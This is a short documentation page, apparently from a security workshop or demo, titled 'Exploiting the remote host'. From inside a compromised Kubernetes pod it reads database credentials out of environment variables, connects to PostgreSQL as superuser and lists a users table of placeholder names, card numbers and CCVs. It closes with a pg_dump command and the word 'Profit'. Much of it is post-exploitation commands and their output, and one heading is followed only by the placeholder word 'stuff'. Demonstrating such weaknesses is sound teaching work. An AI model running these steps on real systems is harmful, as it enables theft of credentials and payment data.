---
id: exploit_host
title: Exploiting the remote host
sidebar_label: Exploit
---

Lets see if there is anything interesting configured in the environment.

## Exploiting the host

stuff

```shell
env

# truncated output

HOSTNAME=search-54fc49cd9d-b7nx7

SEARCH_SERVICE_HOST=10.43.38.166
SEARCH_SERVICE_PORT=9090

PAYMENTS_SERVICE_HOST=10.43.70.143
PAYMENTS_SERVICE_PORT=9090

KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_SERVICE_PORT=443

DATABASE_SERVICE_HOST=10.43.6.193
DATABASE_SERVICE_PORT=5432
DATABASE_USER=root
DATABASE_PASSWORD=please_change_me_barry
```

Install postgres client.

```shell
apt update && apt install -y postgresql-client
```

Connect to the database.

```shell
PGPASSWORD=$DATABASE_PASSWORD psql -h $DATABASE_SERVICE_HOST -p $DATABASE_SERVICE_PORT -U $DATABASE_USER -w -d $DATABASE_NAME
```

Inspect the databases.

```shell
\l

                             List of databases
   Name    | Owner | Encoding |  Collate   |   Ctype    | Access privileges
-----------+-------+----------+------------+------------+-------------------
 postgres  | root  | UTF8     | en_US.utf8 | en_US.utf8 |
 template0 | root  | UTF8     | en_US.utf8 | en_US.utf8 | =c/root          +
           |       |          |            |            | root=CTc/root
 template1 | root  | UTF8     | en_US.utf8 | en_US.utf8 | =c/root          +
           |       |          |            |            | root=CTc/root
 users     | root  | UTF8     | en_US.utf8 | en_US.utf8 |
(4 rows)
```

Inspect the users.

```shell
\du+

                                          List of roles
 Role name |                         Attributes                         | Member of | Description
-----------+------------------------------------------------------------+-----------+-------------
 root      | Superuser, Create role, Create DB, Replication, Bypass RLS | {}        |
```

```shell
\d

            List of relations
 Schema |     Name     |   Type   | Owner
--------+--------------+----------+-------
 public | users        | table    | root
 public | users_id_seq | sequence | root
(2 rows)
```

```shell
SELECT * FROM users;

 id |    name     |   creditcard   | ccv
----+-------------+----------------+-----
  1 | Nic Jackson | 1234-5678-9012 | 123
  2 | Erik Veld   | 5678-9012-1234 | 567
(2 rows)
```

PGPASSWORD=$DATABASE_PASSWORD pg_dump -h $DATABASE_SERVICE_HOST -p $DATABASE_SERVICE_PORT -U $DATABASE_USER -w root

Profit
